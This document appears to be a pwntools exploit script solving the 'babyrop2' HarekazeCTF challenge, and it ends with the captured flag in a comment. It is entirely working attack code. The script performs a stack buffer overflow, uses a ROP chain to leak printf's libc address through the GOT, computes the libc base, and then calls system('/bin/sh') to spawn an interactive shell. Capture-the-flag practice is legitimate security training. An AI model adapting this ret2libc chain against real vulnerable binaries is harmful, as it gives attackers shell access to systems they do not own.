#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'
elf = ELF('babyrop2')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # libc = ELF('./libc.so.6')

# context.log_level = 'DEBUG'

p = elf.process()
# p = remote('problem.harekaze.com',20005)

leak = flat(
    'A' * 40,
    0x400733, # 0x0000000000400733 : pop rdi ; ret
    elf.got['printf'],
    elf.sym['printf'],
    0x4004d1, # 0x00000000004004d1 : ret
    0x400636, # 0x400636 <main>
    endianness = 'little', word_size = 64, sign = False)
p.sendline(leak)
p.recvline()
leak = u64(p.recvuntil('What').split("What")[0].ljust(8, '\x00'))

libc.address = leak - libc.sym['printf']

log.success('Leaked printf@GLIBC: ' + hex(leak))
log.success('GLIBC base address = ' + hex(libc.address))
log.success('GLIBC system address = ' + hex(libc.sym['system']))
log.success('GLIBC /bin/sh = ' + hex(next(libc.search('/bin/sh'))))

shell = flat(
    'A' * 40,
    0x400733, # 0x0000000000400733 : pop rdi ; ret
    next(libc.search('/bin/sh')),
    0x4004d1, # 0x00000000004004d1 : ret
    libc.sym['system'],
    endianness = 'little', word_size = 64, sign = False)
p.sendline(shell)
p.recvline()

p.interactive()

# HarekazeCTF{u53_b55_53gm3nt_t0_pu7_50m37h1ng}
